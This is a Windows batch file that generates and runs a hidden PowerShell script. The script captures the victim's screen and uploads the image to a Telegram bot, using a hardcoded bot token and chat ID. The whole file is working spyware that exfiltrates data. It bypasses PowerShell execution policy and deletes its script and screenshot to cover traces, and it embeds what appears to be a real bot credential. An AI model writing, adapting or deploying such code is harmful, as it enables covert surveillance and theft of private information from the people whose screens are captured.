@echo off
setlocal

set BOT_TOKEN=7749125191:AAG9ALJEsYYA7jDxg3dZzC5GiQNOU94p064
set USER_ID=2001564322

:: Create temporary PowerShell script
set PS_SCRIPT=%temp%\SendScreenshot.ps1

(
echo Add-Type -AssemblyName System.Windows.Forms
echo Add-Type -AssemblyName System.Drawing
echo $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
echo $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
echo $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
echo $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
echo $file = Join-Path $env:TEMP "screenshot.png"
echo $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
echo $bitmap.Dispose()
echo $graphics.Dispose()
echo $botToken = "%BOT_TOKEN%"
echo $chatId = "%USER_ID%"
echo $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
echo $form = @{ chat_id = $chatId; photo = Get-Item $file }
echo Invoke-RestMethod -Uri $uri -Method Post -Form $form
echo Remove-Item $file
) > "%PS_SCRIPT%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%"

del "%PS_SCRIPT%"
pause
